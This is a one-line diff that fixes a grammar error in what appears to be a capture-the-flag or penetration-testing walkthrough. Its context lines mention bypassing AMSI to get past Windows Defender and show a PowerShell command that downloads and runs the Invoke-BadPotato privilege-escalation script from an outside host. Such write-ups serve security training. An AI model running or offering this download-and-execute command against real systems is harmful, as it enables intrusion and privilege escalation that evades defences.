@@ -1090,7 +1090,7 @@ SeTimeZonePrivilege           Cambiar la zona horaria                           
 PS C:\wwwroot>
 ```
 
-Since the target machine have windows defender enabled, we will need to bypass AMSI first
+Since the target machine has windows defender enabled, we will need to bypass AMSI first
 
 ```bash
 PS C:\wwwroot> iex (new-object net.webclient).DownloadString('http://10.10.14.71/PowerSharpBinaries/Invoke-BadPotato.ps1')
